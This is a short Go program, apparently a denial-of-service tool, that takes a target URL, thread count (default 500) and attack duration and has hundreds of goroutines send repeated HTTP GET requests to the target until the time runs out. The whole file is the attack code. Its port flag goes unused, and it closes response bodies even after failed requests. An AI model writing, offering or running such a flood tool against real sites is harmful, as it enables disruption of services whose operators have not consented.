package main

import (
	"flag"
	"net/http"
	"os"
	"sync"
	"time"
)

var (
	target     = flag.String("i", "", "No host specified")
	port       = flag.Int("p", 443, "No port specified")
	threads    = flag.Int("x", 500, "Specify threads")
	attackTime = flag.Int("t", 1, "Specify Time")
)

func sendReq(url string, attackTime int) {

	for start := time.Now(); time.Since(start) < time.Duration(attackTime)*time.Second; {
		resp, err := http.Get(url)
		if err != nil {
			time.Sleep(1)
		}
		resp.Body.Close()
	}
	os.Exit(1)
}

func main() {
	flag.Parse()
	var wg sync.WaitGroup
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendReq(*target, *attackTime)
		}()
	}
	wg.Wait()
}
